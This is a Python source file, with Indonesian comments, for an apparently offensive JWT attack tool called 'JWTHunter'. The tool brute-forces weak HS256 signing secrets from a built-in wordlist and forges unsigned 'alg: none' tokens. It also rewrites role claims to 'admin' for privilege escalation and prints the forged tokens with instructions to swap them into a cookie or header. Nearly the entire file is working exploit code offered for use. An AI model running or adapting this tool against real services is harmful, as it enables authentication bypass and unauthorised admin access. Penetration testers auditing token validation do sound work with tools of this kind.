import jwt
import base64
import json
import concurrent.futures
from colorama import Fore, Style

class JWTHunter:
    def __init__(self, token):
        self.token = token
        try:
            self.header = jwt.get_unverified_header(token)
            self.payload = jwt.decode(token, options={"verify_signature": False})
            self.valid_structure = True
        except:
            self.valid_structure = False
            print(f"{Fore.RED}[!] Error: String bukan format JWT valid.{Style.RESET_ALL}")

        # Wordlist Kunci Lemah (Top 50 JWT Secrets)
        self.wordlist = [
            "secret", "password", "123456", "123456789", "app", "key", "token",
            "auth", "supersecret", "secret123", "admin", "user", "jwt", "test",
            "123", "1234", "qwerty", "login", "pass", "changeme", "dev",
            "development", "signingrequest", "private", "public", "session",
            "system", "default", "s3cret", "mysecretkey", "security"
        ]

    def base64url_encode(self, data):
        """Helper manual encode untuk bypass restriksi library"""
        json_data = json.dumps(data, separators=(",", ":")).encode()
        return base64.urlsafe_b64encode(json_data).decode().rstrip("=")

    def check_weak_secret(self):
        """Mencoba crack HMAC Signature (HS256)"""
        print(f"\n{Fore.YELLOW}[+] Attempting Offline Brute-Force on Signature...{Style.RESET_ALL}")
        
        alg = self.header.get('alg')
        if alg != 'HS256':
            print(f"   {Fore.WHITE}[info] Algorithm is {alg}. Brute-force only works on Symmetric (HS256).")
            return None

        found_key = None
        
        def try_key(secret):
            try:
                # Jika tidak error, berarti key benar
                jwt.decode(self.token, key=secret, algorithms=['HS256'])
                return secret
            except jwt.InvalidSignatureError:
                return None
            except:
                return None

        # Multi-threading Cracking
        with concurrent.futures.ThreadPoolExecutor(max_workers=20) as executor:
            futures = {executor.submit(try_key, key): key for key in self.wordlist}
            for future in concurrent.futures.as_completed(futures):
                res = future.result()
                if res:
                    found_key = res
                    # Stop semua thread lain (simulasi break)
                    break
        
        if found_key:
            print(f"   {Fore.RED}[CRITICAL] WEAK SECRET FOUND: '{found_key}'{Style.RESET_ALL}")
            print(f"   {Fore.WHITE}You can now forge ANY token using this key!")
            return found_key
        else:
            print(f"   {Fore.GREEN}[OK] Secret key seems strong (not in top 50 wordlist).{Style.RESET_ALL}")
            return None

    def forge_none_attack(self):
        """Membuat token palsu dengan alg: none"""
        print(f"\n{Fore.YELLOW}[+] Generating 'None' Algorithm Attack Payload...{Style.RESET_ALL}")
        
        # 1. Modifikasi Header
        fake_header = self.header.copy()
        fake_header['alg'] = 'none'
        
        # 2. Encode ulang
        encoded_header = self.base64url_encode(fake_header)
        encoded_payload = self.base64url_encode(self.payload)
        
        # 3. Gabungkan tanpa signature (format: header.payload.)
        # Beberapa server butuh titik di akhir, beberapa tidak.
        exploit_token = f"{encoded_header}.{encoded_payload}."
        
        print(f"   {Fore.MAGENTA}[EXPLOIT TOKEN]{Style.RESET_ALL}")
        print(f"   {Fore.WHITE}{exploit_token}{Style.RESET_ALL}")
        print(f"   {Fore.CYAN}Usage: Replace your cookie/header with this token. If server accepts it, you are in.{Style.RESET_ALL}")

    def create_admin_token(self, secret_key=None):
        """Memanipulasi Claims (Role Elevation)"""
        print(f"\n{Fore.YELLOW}[+] Forging Admin Token (Privilege Escalation)...{Style.RESET_ALL}")
        
        # Target Claims yang menarik
        target_keys = ['role', 'admin', 'is_admin', 'scope', 'permissions', 'groups', 'user_type']
        new_payload = self.payload.copy()
        
        modified = False
        for key in new_payload.keys():
            if key.lower() in target_keys:
                print(f"   ├── Modifying claim: {key} -> 'admin' / true")
                # Coba ubah jadi indikator admin
                if isinstance(new_payload[key], bool):
                    new_payload[key] = True
                else:
                    new_payload[key] = "admin"
                modified = True
        
        # Jika tidak ada claim yang jelas, kita suntikkan claim baru
        if not modified:
            print("   ├── No obvious role claims found. Injecting 'role': 'admin'...")
            new_payload['role'] = 'admin'
            new_payload['is_admin'] = True

        # RE-SIGNING
        if secret_key:
            # Jika kita punya key (dari bruteforce tadi)
            try:
                forged_token = jwt.encode(new_payload, secret_key, algorithm='HS256')
                print(f"\n   {Fore.RED}[PWNED] Valid Admin Token (Signed with Key):{Style.RESET_ALL}")
                print(f"   {forged_token}")
            except:
                pass
        else:
            # Jika tidak punya key, kita gunakan teknik 'None' lagi tapi dengan payload admin
            fake_header = self.header.copy()
            fake_header['alg'] = 'none'
            enc_header = self.base64url_encode(fake_header)
            enc_payload = self.base64url_encode(new_payload)
            forged_token = f"{enc_header}.{enc_payload}."
            
            print(f"\n   {Fore.RED}[ATTACK] Forged Admin Token (Unsigned/None Alg):{Style.RESET_ALL}")
            print(f"   {forged_token}")

    def run_attack(self):
        print(f"\n{Fore.CYAN}[*] MODULE START: JWT Manipulation & Breaker{Style.RESET_ALL}")
        
        if not self.valid_structure:
            return

        # Step 1: Coba Crack Key
        key = self.check_weak_secret()
        
        # Step 2: Coba None Attack
        self.forge_none_attack()
        
        # Step 3: Coba Manipulasi Data (Jadi Admin)
        # Jika key ketemu, pakai key. Jika tidak, pakai teknik None.
        self.create_admin_token(key)
        
        print("-" * 60)

def run_jwt_attack(token_str):
    # Bersihkan input
    clean_token = token_str.replace("Bearer ", "").strip()
    engine = JWTHunter(clean_token)
    engine.run_attack()